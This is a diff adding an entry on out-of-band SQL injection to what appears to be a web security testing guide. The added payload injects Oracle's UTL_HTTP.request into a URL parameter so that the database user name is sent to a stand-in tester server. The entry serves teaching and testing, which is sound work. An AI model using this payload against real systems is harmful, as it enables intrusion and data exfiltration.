@@ -366,3 +366,24 @@
   Then the tester can manipulate the parameter passed to GET_HOST_NAME() function and the result will be shown in the error message.
 
 </details>
+
+<details>
+  <summary>How understand what backend database uses (Out of Band Exploitation Technique)?</summary>
+
+  The technique consists of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester’s server.
+
+  Consider the following SQL query:
+
+  `SELECT * FROM products WHERE id_product=$id_product`
+
+  Consider also the request to a script that executes the query above:
+
+  `http://www.example.com/product.php?id=10`
+
+  The malicious request would be:
+
+  `http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`
+
+  UTL_HTTP.request function will try to connect to the fake server and make an HTTP GET request containing the return from the query: SELECT user FROM DUAL.
+
+</details>
